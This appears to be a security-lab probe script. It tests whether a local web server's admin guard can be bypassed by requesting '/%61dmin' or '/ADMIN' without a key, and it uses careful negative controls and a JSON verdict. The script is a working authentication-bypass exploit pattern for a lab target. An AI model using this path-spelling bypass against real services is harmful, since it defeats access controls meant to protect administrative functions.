#!/usr/bin/env python3
"""
lab-03 probe: reach the protected handler without the key, using only a different spelling of the path.

Controls, because "I got a 200" proves nothing on its own:

1. The plain path must be refused. If /admin returns 200 without a key, the guard does not work at all
   and the encoding is irrelevant.
2. An encoded spelling of an unprotected path must behave the same as its plain form. That shows the
   router decodes consistently, so the bypass is about the guard's view of the path, not about encoding
   being broken in general.
"""
import json
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8733"


def get(path, key=None):
    req = urllib.request.Request(BASE + path)
    if key:
        req.add_header("X-Key", key)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def main():
    attack = {}
    attack["encoded"], attack["encoded_body"] = get("/%61dmin")
    attack["case"], attack["case_body"] = get("/ADMIN")

    control = {}
    plain_status, plain_body = get("/admin")
    control["plain_status"] = plain_status
    control["plain_body"] = plain_body
    # a control has to be a boolean decision, not a status code that happens to be truthy
    control["plain_refused"] = plain_status == 401
    s_plain, _ = get("/public")
    s_enc, _ = get("/%70ublic")
    control["encoded_public_matches_plain"] = (s_plain == s_enc == 200)
    # and the key does work, so the guard is not simply broken for everyone
    with_key, _ = get("/admin", "lab-admin-key")
    control["valid_key_allowed"] = with_key == 200

    reached = lambda t: t[0] == 200 and t[1].get("page") == "admin"  # noqa: E731
    attack_ok = reached((attack["encoded"], attack["encoded_body"])) or \
        reached((attack["case"], attack["case_body"]))
    control_ok = (control["plain_refused"] is True
                  and control["encoded_public_matches_plain"] is True
                  and control["valid_key_allowed"] is True)

    result = {
        "lab": "lab-03-route-order",
        "factor": "L04-001",
        "pattern": None,
        "attack": {
            "percent_encoded": {"path": "/%61dmin", "status": attack["encoded"],
                                "reached_admin": reached((attack["encoded"], attack["encoded_body"]))},
            "uppercase": {"path": "/ADMIN", "status": attack["case"],
                          "reached_admin": reached((attack["case"], attack["case_body"]))},
        },
        "negative_control": control,
        "oracle": "the admin handler returns its content to a request whose raw path did not match the guard",
        "attack_confirmed": attack_ok,
        "control_clean": control_ok,
        "verdict": "OBSERVED" if (attack_ok and control_ok) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
